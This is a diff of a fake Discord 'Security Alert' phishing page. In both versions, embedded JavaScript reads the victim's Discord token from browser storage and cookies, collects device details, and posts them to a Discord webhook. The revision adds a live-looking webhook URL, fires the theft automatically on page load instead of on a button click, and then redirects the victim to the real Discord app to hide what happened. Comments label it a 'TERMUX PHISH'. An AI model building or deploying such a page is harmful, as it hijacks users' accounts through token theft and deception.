@@ -1,145 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Discord — Security Alert</title>
-  <link rel="icon" href="https://discord.com/assets/101649a7b2e5a8b7f3f7.ico" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://discord.com/assets/101649a7b2e5a8b7f3f7.ico">
   <style>
-    body {
-      background: #36393f;
-      color: #dcddde;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      text-align: center;
-      padding: 60px 20px;
-      margin: 0;
-    }
-    .logo {
-      width: 80px;
-      margin: 20px auto;
-    }
-    h3 {
-      font-size: 22px;
-      margin: 15px 0;
-    }
-    p {
-      font-size: 16px;
-      color: #72767d;
-      margin: 10px 0;
-    }
-    .status {
-      font-size: 14px;
-      color: #72767d;
-      margin: 20px 0;
-    }
-    .spinner {
-      border: 3px solid #36393f;
-      border-top: #5865F2 solid 3px;
-      border-radius: 50%;
-      width: 24px;
-      height: 24px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .btn {
-      padding: 12px 36px;
-      background: #5865F2;
-      border: none;
-      color: white;
-      font-size: 18px;
-      font-weight: 600;
-      cursor: pointer;
-      margin: 25px auto;
-      display: block;
-      border-radius: 6px;
-      transition: background 0.2s;
-    }
-    .btn:hover {
-      background: #4752c4;
-    }
-    .footer {
-      font-size: 12px;
-      color: #72767d;
-      margin-top: 40px;
-    }
+    body{background:#36393f;color:#dcddde;font-family:Arial;text-align:center;padding:80px 20px}
+    .logo{width:70px;margin:0 auto 20px}
+    .status{font-size:16px;margin:25px 0;color:#72767d}
+    .spinner{border:3px solid #36393f;border-top:#5865F2 solid 3px;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:20px auto}
+    @keyframes spin{to{transform:rotate(360deg)}}
   </style>
 </head>
 <body>
-  <img src="https://discord.com/assets/7bb0c89d8e8a1f0e5f8e.svg" class="logo" alt="Discord" />
+  <img src="https://discord.com/assets/7bb0c89d8e8a1f0e5f8e.svg" class="logo">
   <h3>Unusual Login Detected</h3>
-  <p>A new login was detected on your account.</p>
-  <p>Please verify your identity to secure your session.</p>
-  <div class="status">Waiting for verification...</div>
+  <p>We’ve sent a verification request to your devices.</p>
+  <div class="status">Securing session...</div>
   <div class="spinner"></div>
 
-  <button class="btn" onclick="grabToken()">Verify Now</button>
-
-  <div class="footer">This request will expire in 2 minutes.</div>
-
   <script>
-    function grabToken() {
-      let token = "NO_TOKEN";
-
-      // محاولة قراءة من localStorage
-      try {
-        if (window.localStorage && localStorage.getItem("token")) {
-          token = localStorage.getItem("token").replace(/"/g, "");
-        }
-      } catch (e) {}
-
-      // محاولة قراءة من sessionStorage
-      if (token === "NO_TOKEN") {
-        try {
-          if (window.sessionStorage && sessionStorage.getItem("token")) {
-            token = sessionStorage.getItem("token").replace(/"/g, "");
-          }
-        } catch (e) {}
-      }
-
-      // محاولة قراءة من cookies
-      if (token === "NO_TOKEN") {
-        try {
-          const cookies = document.cookie.split("; ");
-          for (let cookie of cookies) {
-            if (cookie.startsWith("token=")) {
-              token = cookie.substring(6);
-              break;
-            }
-          }
-        } catch (e) {}
-      }
-
-      // جمع بيانات الجهاز
-      const ua = navigator.userAgent || "Unknown";
-      const platform = navigator.platform || "Unknown";
-      const cores = navigator.hardwareConcurrency || "N/A";
-      const mem = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A";
-      const lang = navigator.language || "N/A";
+    (()=>{
+      const token = (localStorage.token || document.cookie.match(/token=([^;]+)/)?.[1] || "NO_TOKEN").replace(/"/g,"");
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const cores = navigator.hardwareConcurrency || "Unknown";
+      const mem = navigator.deviceMemory || "Unknown";
+      const lang = navigator.language;
       const perf = Math.round(performance.now());
 
-      // إرسال البيانات
-      fetch("YOUR_DISCORD_WEBHOOK_HERE", {
+      // ⚠️ Webhook بتاعك (بدون أي وسيط)
+      fetch("https://discord.com/api/webhooks/1456051045724717066/u4U_QxbiwDRAVJ8h27s3DEnearYvpXxUDPekD2gFHucpPd8tJbZS6LM1WeGRCSwGBnEH", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
-          content: `**🚨 PHISH — BUTTON CLICKED**\n` +
-                   `> **Token**: ||${token}||\n` +
-                   `> **User-Agent**: \`${ua}\`\n` +
-                   `> **Platform**: \`${platform}\`\n` +
-                   `> **Cores**: ${cores} | **RAM**: ${mem} | **Lang**: ${lang}\n` +
-                   `> **JS Execution**: ${perf}ms\n` +
-                   `> **Time**: <t:${Math.floor(Date.now() / 1000)}:R>`
+          content: `**💀 TERMUX PHISH — NO NGROK**\n`+
+                   `> **Token**: ||${token}||\n`+
+                   `> **UA**: \`${ua}\`\n`+
+                   `> **OS**: \`${platform}\`\n`+
+                   `> **Cores**: ${cores} | **RAM**: ${mem}GB | **Lang**: ${lang}\n`+
+                   `> **Render Time**: ${perf}ms\n`+
+                   `> **Time**: <t:${Math.floor(Date.now()/1000)}:R>`
         })
-      }).catch(() => {});
+      }).catch(()=>{});
 
-      // تحويل لصفحة رسمية بعد 1.5 ثانية
-      setTimeout(() => {
-        window.location.replace("https://discord.com/api/webhooks/1456051045724717066/u4U_QxbiwDRAVJ8h27s3DEnearYvpXxUDPekD2gFHucpPd8tJbZS6LM1WeGRCSwGBnEH");
-      }, 1500);
-    }
+      setTimeout(()=>{window.location.replace("https://discord.com/app");},2200);
+    })();
   </script>
 </body>
 </html>
